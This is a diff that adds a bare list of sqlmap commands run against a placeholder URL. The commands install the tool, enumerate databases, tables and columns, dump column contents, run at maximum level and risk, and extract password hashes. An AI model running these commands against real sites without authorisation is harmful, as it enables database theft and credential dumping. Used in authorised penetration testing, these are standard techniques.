@@ -1,0 +1,10 @@
+sudo apt update
+sudo apt install sqlmap
+sqlmap --version
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+sqlmap -u "http://target.com/page.php?id=1" --tables -D database_name
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump
+sqlmap -u "http://target.com/page.php?id=1" --batch --level=5 --risk=3
+sqlmap -r request.txt --batch
+sqlmap -u "http://target.com/page.php?id=1" --passwords
